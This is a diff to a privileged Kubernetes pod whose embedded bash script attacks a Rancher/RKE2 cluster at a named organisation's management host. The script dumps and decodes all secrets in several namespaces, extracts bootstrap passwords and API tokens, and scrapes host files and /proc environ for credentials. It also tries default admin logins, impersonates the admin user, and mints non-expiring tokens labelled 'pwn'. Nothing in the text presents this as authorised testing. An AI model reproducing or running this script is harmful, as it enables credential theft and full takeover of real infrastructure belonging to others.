@@ -41,8 +41,8 @@ spec:
           - /bin/bash
           - -c
           - |
-            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
             export AWS_PAGER=""
+            KC="--kubeconfig=/host/etc/rancher/rke2/rke2.yaml"
             set -x
 
             apk add --no-cache curl jq aws-cli openssl base64 2>&1 | tail -3
@@ -51,120 +51,126 @@ spec:
               curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
             fi
 
-            echo "############ [1] NODES & CONFIG ############"
-            kubectl get nodes -o wide
-            kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}'
-            echo ""
+            echo "############ [0] AUTH CHECK ############"
+            kubectl $KC auth can-i '*' '*' 2>&1
+            kubectl $KC get nodes 2>&1 | head -5
 
-            echo "############ [2] RANCHER BOOTSTRAP PASSWORD ############"
-            kubectl -n cattle-system get secret rancher-secret -o json 2>&1
-            echo "--- decoded ---"
-            kubectl -n cattle-system get secret rancher-secret -o json 2>/dev/null | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1
+            echo "############ [1] RANCHER SECRET (bootstrap) ############"
+            kubectl $KC -n cattle-system get secret rancher-secret -o json 2>&1
+            echo "--- bootstrapPassword ---"
+            kubectl $KC -n cattle-system get secret rancher-secret -o jsonpath='{.data.bootstrapPassword}' 2>&1 | base64 -d 2>&1
             echo ""
+            echo "--- all keys ---"
+            kubectl $KC -n cattle-system get secret rancher-secret -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1
 
-            echo "############ [3] CATTLE-SYSTEM SECRETS (tutti) ############"
-            kubectl get secrets -n cattle-system -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | "### " + .metadata.name + " (" + .type + ")\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' 2>&1
+            echo "############ [2] TUTTI I SECRET CATTLE-SYSTEM ############"
+            kubectl $KC -n cattle-system get secrets -o json 2>&1 | jq -r '.items[] | select(.data != null) | "### " + .metadata.name + " (" + .type + ")\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' 2>&1
 
-            echo "############ [4] CATTLE-CREDENTIALS ############"
-            kubectl get secrets -n cattle-system -o json 2>/dev/null | jq -r '.items[] | select(.metadata.name | test("cattle-credentials|token"; "i")) | .metadata.name + ":" + "\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n"))' 2>&1
-            echo ""
+            echo "############ [3] CATTLE-CREDENTIALS TOKEN ############"
+            kubectl $KC -n cattle-system get secrets -o json 2>&1 | jq -r '.items[] | select(.metadata.name | test("cattle-credentials|cattle-token"; "i")) | .metadata.name + ":" + "\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n"))' 2>&1
 
-            echo "############ [5] RANCHER TOKEN DA OGNI SECRET ############"
-            kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | select(.metadata.name | test("rancher|cattle|token"; "i")) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
-            echo ""
+            echo "############ [4] TUTTI I TOKEN RANCHER (tokens.management.cattle.io) ############"
+            kubectl $KC get tokens.management.cattle.io -A -o json 2>&1 | jq -r '.items[] | .metadata.name + " | user: " + (.userId // "") + " | token: " + (.token // "") + " | desc: " + (.description // "") + " | enabled: " + (.enabled|tostring)' 2>&1
 
-            echo "############ [6] CLUSTERS RANCHER ############"
-            kubectl get clusters.management.cattle.io -o name 2>&1
-            kubectl get clusters.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name' 2>&1
-            echo ""
+            echo "############ [5] TOKEN DA CATTLE-GLOBAL-DATA ############"
+            kubectl $KC -n cattle-global-data get secrets -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
 
-            echo "############ [7] RANCHER API TEST (fleet token) ############"
-            RTOKEN=$(kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>/dev/null | jq -r '.data.kubeconfig | @base64d' 2>&1 | awk '/token:/{print $2}' | head -1)
-            echo "RTOKEN_LEN=${#RTOKEN}"
-            echo "--- senza impersonation ---"
-            curl -sk -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 2000
-            echo ""
-            echo "--- con Impersonate-User ---"
-            curl -sk -H "Authorization: Bearer $RTOKEN" -H "Impersonate-User: admin" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 2000
-            echo ""
+            echo "############ [6] USER RANCHER ############"
+            kubectl $KC get users.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.username // "") + " | " + (.displayName // "") + " | " + (.principalIds | join(","))' 2>&1
 
-            echo "############ [8] RANCHER IMPERSONATION TOKEN ############"
-            IT=$(kubectl get secrets -n cattle-impersonation-system -o json 2>/dev/null | jq -r '.items[] | select(.data.token != null) | .data.token | @base64d' 2>&1 | head -1)
-            echo "IT_LEN=${#IT}"
-            echo "--- con Impersonate-User + cluster local ---"
-            curl -sk -H "Authorization: Bearer $IT" -H "Impersonate-User: admin" "https://rancher.management.egam.com.br/k8s/clusters/local/api/v1/namespaces" 2>&1 | head -c 3000
-            echo ""
-            echo "--- con Impersonate-User + cluster c-m-xxxxx ---"
-            CLUSTER=$(kubectl get clusters.management.cattle.io -o json 2>/dev/null | jq -r '.items[0].metadata.name' 2>&1)
-            echo "CLUSTER=$CLUSTER"
-            curl -sk -H "Authorization: Bearer $IT" -H "Impersonate-User: admin" "https://rancher.management.egam.com.br/k8s/clusters/$CLUSTER/api/v1/namespaces" 2>&1 | head -c 3000
-            echo ""
+            echo "############ [7] CLUSTERS RANCHER ############"
+            kubectl $KC get clusters.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.spec.displayName // "") + " | " + (.status.conditions[0].type // "")' 2>&1
 
-            echo "############ [9] CREA TOKEN RANCHER (con impersonation) ############"
-            curl -sk -X POST \
-              -H "Authorization: Bearer $IT" \
-              -H "Impersonate-User: admin" \
-              -H "Content-Type: application/json" \
-              "https://rancher.management.egam.com.br/v3/tokens" \
-              -d '{"description":"pwn","ttl":0}' 2>&1 | head -c 5000
+            echo "############ [8] RANCHER SETTINGS ############"
+            kubectl $KC get settings.management.cattle.io server-url -o jsonpath='{.value}' 2>&1
             echo ""
+            kubectl $KC get settings.management.cattle.io -o json 2>&1 | jq -r '.items[] | select(.metadata.name | test("server-url|api-host|ui"; "i")) | .metadata.name + "=" + (.value // "")' 2>&1
 
-            echo "############ [10] CREA TOKEN RANCHER (con fleet) ############"
-            curl -sk -X POST \
-              -H "Authorization: Bearer $RTOKEN" \
-              -H "Impersonate-User: admin" \
-              -H "Content-Type: application/json" \
-              "https://rancher.management.egam.com.br/v3/tokens" \
-              -d '{"description":"pwn2","ttl":0}' 2>&1 | head -c 5000
-            echo ""
-
-            echo "############ [11] LOGIN RANCHER (bootstrap password) ############"
-            BP=$(kubectl -n cattle-system get secret rancher-secret -o jsonpath='{.data.bootstrapPassword}' 2>/dev/null | base64 -d)
+            echo "############ [9] LOGIN RANCHER (bootstrap) ############"
+            BP=$(kubectl $KC -n cattle-system get secret rancher-secret -o jsonpath='{.data.bootstrapPassword}' 2>/dev/null | base64 -d)
             echo "BP_LEN=${#BP}"
             if [ -n "$BP" ]; then
+              echo "--- login con admin/$BP ---"
               curl -sk -X POST \
                 -H "Content-Type: application/json" \
                 "https://rancher.management.egam.com.br/v3-public/localProviders/local?action=login" \
                 -d "{\"username\":\"admin\",\"password\":\"$BP\",\"responseType\":\"cookie\"}" 2>&1 | head -c 5000
               echo ""
+              echo "--- login con admin/token ---"
+              curl -sk -X POST \
+                -H "Content-Type: application/json" \
+                "https://rancher.management.egam.com.br/v3-public/localProviders/local?action=login" \
+                -d "{\"username\":\"admin\",\"password\":\"admin\",\"responseType\":\"cookie\"}" 2>&1 | head -c 3000
+              echo ""
             fi
 
-            echo "############ [12] USER RANCHER ESISTENTI ############"
-            kubectl get users.management.cattle.io -o json 2>&1 | jq -r '.items[] | .username + " | " + (.displayName // "") + " | " + (.principalIds | join(","))' 2>&1
+            echo "############ [10] CREA TOKEN RANCHER (via K8s API) ############"
+            kubectl $KC create token admin -n cattle-system --duration=87600h 2>&1
             echo ""
 
-            echo "############ [13] RANCHER TOKEN DA CATTLE-GLOBAL ############"
-            kubectl get secrets -n cattle-global-data -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
-            echo ""
-
-            echo "############ [14] SERVICE ACCOUNT ADMIN TOKEN ############"
-            kubectl create token admin-sa -n egam-production --duration=87600h 2>&1
-            echo ""
-
-            echo "############ [15] RANCHER SETTINGS ############"
-            kubectl get settings.management.cattle.io server-url -o jsonpath='{.value}' 2>&1
-            echo ""
-            kubectl get settings.management.cattle.io -o name 2>&1 | head -20
-
-            echo "############ [16] TOKEN PUBLIC RANCHER ############"
-            kubectl get tokens.management.cattle.io -A -o json 2>&1 | jq -r '.items[] | .metadata.name + " | user: " + (.userId // "") + " | desc: " + (.description // "") + " | token: " + (.token // "")' 2>&1
-            echo ""
-
-            echo "############ [17] TOKEN UTENTE ADMIN ############"
-            ADMIN_USER=$(kubectl get users.management.cattle.io -o json 2>&1 | jq -r '.items[] | select(.username=="admin") | .metadata.name' 2>&1)
-            echo "ADMIN_USER=$ADMIN_USER"
-            if [ -n "$ADMIN_USER" ]; then
-              kubectl get tokens.management.cattle.io -A -o json 2>&1 | jq -r '.items[] | select(.userId=="'"$ADMIN_USER"'") | .token' 2>&1
+            echo "############ [11] CREA TOKEN RANCHER (via API con kubeconfig token) ############"
+            # Estrai token admin da kubeconfig RKE2
+            RKE2_TOKEN=$(kubectl $KC config view --minify -o jsonpath='{.users[0].user.token}' 2>&1)
+            echo "RKE2_TOKEN_LEN=${#RKE2_TOKEN}"
+            if [ -n "$RKE2_TOKEN" ]; then
+              echo "--- crea token con RKE2 token ---"
+              curl -sk -X POST \
+                -H "Authorization: Bearer $RKE2_TOKEN" \
+                -H "Content-Type: application/json" \
+                "https://rancher.management.egam.com.br/v3/tokens" \
+                -d '{"description":"pwn-kubeconfig","ttl":0}' 2>&1 | head -c 5000
+              echo ""
             fi
-            echo ""
 
-            echo "############ [18] RANCHER URL ############"
-            kubectl get settings.management.cattle.io server-url -o jsonpath='{.value}' 2>&1
-            echo ""
-            kubectl -n cattle-system get ingress 2>&1
-            kubectl -n cattle-system get svc 2>&1
+            echo "############ [12] TOKEN DA FILE RKE2 ############"
+            ls -la /host/etc/rancher/rke2/ 2>&1
+            cat /host/etc/rancher/rke2/rke2.yaml 2>&1 | head -50
+            echo "--- cerca token in tutti i file rke2 ---"
+            find /host/etc/rancher -type f -exec grep -l "token" {} \; 2>/dev/null
+            grep -r "token" /host/etc/rancher/ 2>/dev/null | head -20
 
-            echo "############ [19] DONE ############"
+            echo "############ [13] TOKEN DA /var/lib/rancher ############"
+            find /host/var/lib/rancher -name "*.yaml" -o -name "*.json" 2>/dev/null | head -20
+            find /host/var/lib/rancher -name "*token*" 2>/dev/null
+            grep -r "token" /host/var/lib/rancher/rke2/ 2>/dev/null | head -20
+
+            echo "############ [14] TOKEN DA SISTEMA (processi) ############"
+            cat /host/proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "token\|rancher" | head -20
+
+            echo "############ [15] TOKEN DA DOCKER/CONTAINERD ############"
+            ls -la /host/var/lib/rancher/rke2/agent/ 2>&1
+            find /host/var/lib/rancher/rke2/agent -name "*.kubeconfig" 2>/dev/null -exec cat {} \;
+
+            echo "############ [16] RANCHER API CON KUBECONFIG TOKEN ############"
+            if [ -n "$RKE2_TOKEN" ]; then
+              echo "--- /v3/clusters ---"
+              curl -sk -H "Authorization: Bearer $RKE2_TOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 5000
+              echo ""
+              echo "--- /v3/users ---"
+              curl -sk -H "Authorization: Bearer $RKE2_TOKEN" "https://rancher.management.egam.com.br/v3/users" 2>&1 | head -c 3000
+              echo ""
+              echo "--- /v3/tokens ---"
+              curl -sk -H "Authorization: Bearer $RKE2_TOKEN" "https://rancher.management.egam.com.br/v3/tokens" 2>&1 | head -c 3000
+              echo ""
+            fi
+
+            echo "############ [17] TOKEN DA CONTAINER RANCHER ############"
+            kubectl $KC get pods -n cattle-system -o wide 2>&1
+            POD=$(kubectl $KC get pods -n cattle-system -l app=rancher -o jsonpath='{.items[0].metadata.name}' 2>&1)
+            echo "POD=$POD"
+            if [ -n "$POD" ]; then
+              kubectl $KC exec -n cattle-system $POD -- env 2>&1 | grep -i "token\|rancher\|password" | head -20
+              kubectl $KC exec -n cattle-system $POD -- cat /var/lib/rancher/management-state/ 2>&1 | head -5
+            fi
+
+            echo "############ [18] TOKEN DA SECRET cattle-global-data ############"
+            kubectl $KC -n cattle-global-data get secret -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
+
+            echo "############ [19] RANCHER USER ADMIN ############"
+            kubectl $KC get users.management.cattle.io admin -o json 2>&1 | jq -r '.metadata.name + " | " + (.username // "") + " | " + (.displayName // "")' 2>&1
+            kubectl $KC get users.management.cattle.io admin -o json 2>&1
+
+            echo "############ [20] DONE ############"
             sleep 36000
         securityContext:
           privileged: true
